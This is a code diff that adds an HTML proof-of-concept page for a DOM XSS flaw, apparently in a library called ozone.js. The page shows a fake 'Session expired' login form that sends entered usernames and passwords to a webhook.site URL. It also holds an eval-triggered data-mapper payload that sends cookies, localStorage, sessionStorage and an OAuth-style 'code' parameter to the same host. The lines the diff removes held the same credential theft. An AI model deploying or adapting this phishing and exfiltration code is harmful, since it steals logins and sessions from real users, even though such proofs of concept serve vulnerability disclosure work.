@@ -1,29 +1,54 @@
-<script>
-  window.onload = () => {
-    try {
-      const select = document.querySelector('select[data-mapper]');
-      const mapper = select?.getAttribute('data-mapper');
-      if (mapper) {
-        const func = eval(mapper);
-        if (typeof func === "function") func();
-      }
-    } catch (e) {
-      console.error("Error ejecutando mapper:", e);
-    }
-  };
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>PoC DOM XSS - ozone.js</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="ozone.js"></script>
+  </head>
+  <body>
+    <h2>Session expired. Please login again</h2>
+    <form id="fakeLogin">
+      <input type="text" id="username" placeholder="Email"/><br>
+      <input type="password" id="password" placeholder="Password"/><br>
+      <button type="submit">Login</button>
+    </form>
+    <select id="trigger"
+      data-src-url="/api/data"
+      data-mapper="()=>{ 
+        const code = new URLSearchParams(location.search).get('code');
+        const cookie = document.cookie;
+        const local = JSON.stringify(localStorage);
+        const session = JSON.stringify(sessionStorage);
+        fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
+          method: 'POST',
+          headers: {'Content-Type': 'text/plain'},
+          body: JSON.stringify({code, cookie, localStorage: local, sessionStorage: session})
+        });
+      }">
+    </select>
 
-  document.getElementById("fakeLogin").addEventListener("submit", function (e) {
-    e.preventDefault();
-    const user = document.getElementById("username").value;
-    const pass = document.getElementById("password").value;
-    fetch("https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: user,
-        password: pass,
-      }),
-    });
-  });
-</script>
+    <script>
+      // Autoejecuta mapper para exfiltrar
+      window.onload = () => {
+        const el = document.querySelector('select[data-mapper]');
+        const fn = el?.getAttribute('data-mapper');
+        if (fn) eval(fn)();
+      };
+
+      // Captura login y exfiltra por POST
+      document.getElementById("fakeLogin").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        fetch("https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc", {
+          method: "POST",
+          headers: {"Content-Type": "text/plain"},
+          body: JSON.stringify({username, password})
+        });
+      });
+    </script>
+  </body>
+</html>
+
 
